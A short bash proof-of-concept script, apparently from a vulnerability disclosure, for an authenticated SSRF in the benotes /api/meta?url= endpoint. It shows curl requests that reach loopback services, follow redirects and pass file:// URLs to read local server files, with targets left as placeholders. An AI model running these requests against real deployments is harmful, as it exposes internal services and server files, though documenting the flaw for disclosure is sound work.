#!/usr/bin/env bash
# BENOTES-01 - Authenticated SSRF: GET /api/meta?url= -> unvalidated curl_exec
# (CURLOPT_FOLLOWLOCATION=1, no scheme allow-list, no private-IP block).
# Placeholders: <BASE_URL> = benotes base URL, <VALID_JWT> = any user's JWT,
# <LOOPBACK_TARGET> = an internal/loopback-only HTTP service.

# 0) Control: no token -> 401 (auth:api enforced)
curl -i "<BASE_URL>/api/meta?url=http://127.0.0.1:9/"

# 1) Login (any account; accounts are admin-created)
# curl -s -X POST -H "Content-Type: application/json" \
#      -d '{"email":"<USER>","password":"<PASS>"}' "<BASE_URL>/api/auth/login"

# 2) Internal HTTP fetch with content read-back (title/description of the internal page)
curl -s -H "Authorization: Bearer <VALID_JWT>" \
     "<BASE_URL>/api/meta?url=<LOOPBACK_TARGET>/"

# 3) Redirect following: target 302s to another internal path; the hop is followed
curl -s -H "Authorization: Bearer <VALID_JWT>" \
     "<BASE_URL>/api/meta?url=<LOOPBACK_TARGET>/redir.php"

# 4) Scheme breadth: file:// passes Laravel's 'url' rule and reaches libcurl
curl -s -H "Authorization: Bearer <VALID_JWT>" \
     "<BASE_URL>/api/meta?url=file://localhost/<canary-path>"
